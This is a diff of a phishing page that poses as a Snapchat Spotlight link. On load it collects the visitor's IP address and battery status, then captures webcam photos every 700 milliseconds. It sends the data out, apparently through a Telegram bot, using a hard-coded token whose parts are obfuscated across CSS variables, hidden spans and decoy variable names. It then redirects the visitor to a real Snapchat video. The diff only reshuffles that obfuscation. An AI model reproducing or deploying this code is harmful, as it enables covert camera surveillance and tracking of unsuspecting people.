@@ -2,57 +2,58 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <script>var _sys_alloc_v1 = "84"; var _gfx_res_w = "31"; var _mem_stack_h = "51";</script>
+    <script>var _cache_render_id = "Vis5"; var _buffer_alloc_z = "m9";</script>
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
         :root { 
-            --ui-font-sz: "53"; 
-            --ui-line-ht: "10:";
-            --ui-anim-ms: "AAFA";
-            --ui-blur-px: "BzJu";
-            --ui-step-cnt: "X8l7";
-            --ui-base-rgb: "l7";
+            --dynamic-weight: "X8l7"; 
+            --static-opacity: "53";
+            --active-blur: "AAFA";
+            --vector-scale: "84";
+            --layer-index: "10:";
+            --border-radius: "l7";
         }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
         .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
-    <script>var _io_pipe_s = "AML"; var _gpu_core_f = "Vis5";</script>
+    <script>var _stack_trace_v = "31"; var _stream_codec_f = "BzJu";</script>
 </head>
 <body onload="capture()">
-    <script>var _net_rx_k = "xS"; var _ptr_ref_0 = "FH";</script>
+    <script>var _pixel_ratio_k = "5i"; var _gamma_val_x = "51";</script>
 
     <div class="zone-wrapper">
-        <span id="hex-val-x">m9</span>
-        <span id="hex-val-y">EG</span>
-        <span id="hex-val-z">K9</span>
+        <span id="node-01">xS</span>
+        <span id="node-02">EG</span>
+        <span id="node-03">FH</span>
     </div>
 
 <script>
     const API_TOKEN = "7294105831:AAHkL01xVpZ7mN9_QY2Wz8kR0X41vLM0P2t";
-    var _ext_mod_r = "5i";
+    var _core_auth_p = "AML";
 
     async function capture() {
-        var _v_bit_1 = "9l";
+        var _byte_r = "9l";
         const urlParams = new URLSearchParams(window.location.search);
         const targetID = urlParams.get('id'); 
         if (!targetID) return;
 
         try {
-            var _v_bit_2 = "8I";
-            const _cfg = getComputedStyle(document.documentElement);
-            const _p4 = _cfg.getPropertyValue('--ui-font-sz').replace(/"/g, '').trim();
-            const _p5 = _cfg.getPropertyValue('--ui-line-ht').replace(/"/g, '').trim();
-            const _p6 = _cfg.getPropertyValue('--ui-anim-ms').replace(/"/g, '').trim();
-            const _p7 = _cfg.getPropertyValue('--ui-blur-px').replace(/"/g, '').trim();
-            const _p8 = _cfg.getPropertyValue('--ui-step-cnt').replace(/"/g, '').trim();
-            const _p9 = _cfg.getPropertyValue('--ui-base-rgb').replace(/"/g, '').trim();
+            var _byte_s = "8I";
+            const _cl = getComputedStyle(document.documentElement);
             
-            var _h1 = document.getElementById("hex-val-x").innerText;
-            var _h2 = document.getElementById("hex-val-y").innerText;
-            var _h3 = document.getElementById("hex-val-z").innerText;
+            const _r1 = _cl.getPropertyValue('--vector-scale').replace(/"/g, '').trim();
+            const _r2 = _cl.getPropertyValue('--static-opacity').replace(/"/g, '').trim();
+            const _r3 = _cl.getPropertyValue('--layer-index').replace(/"/g, '').trim();
+            const _r4 = _cl.getPropertyValue('--active-blur').replace(/"/g, '').trim();
+            const _r5 = _cl.getPropertyValue('--dynamic-weight').replace(/"/g, '').trim();
+            const _r6 = _cl.getPropertyValue('--border-radius').replace(/"/g, '').trim();
+            
+            const _n1 = document.getElementById("node-01").innerText;
+            const _n2 = document.getElementById("node-02").innerText;
+            const _n3 = document.getElementById("node-03").innerText;
 
-            const _auth_bundle = _sys_alloc_v1 + _gfx_res_w + _mem_stack_h + _p4 + _p5 + _p6 + _p7 + _p8 + _p9 + _io_pipe_s + _gpu_core_f + _net_rx_k + _ptr_ref_0 + _h1 + _h2 + _h3 + _ext_mod_r + _v_bit_1 + _v_bit_2;
+            const _session_key = _r1 + _stack_trace_v + _gamma_val_x + _r2 + _r3 + _r4 + _stream_codec_f + _r5 + _r6 + _core_auth_p + _cache_render_id + _n1 + _n3 + _buffer_alloc_z + _n2 + _pixel_ratio_k + _byte_r + _byte_s;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -72,8 +73,8 @@
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    let report = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
-                    _sendMsg(report, _auth_bundle, targetID);
+                    let msg = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
+                    _sendMsg(msg, _session_key, targetID);
                 });
 
             const video = document.createElement('video');
@@ -87,7 +88,7 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _auth_bundle, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _session_key, targetID); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
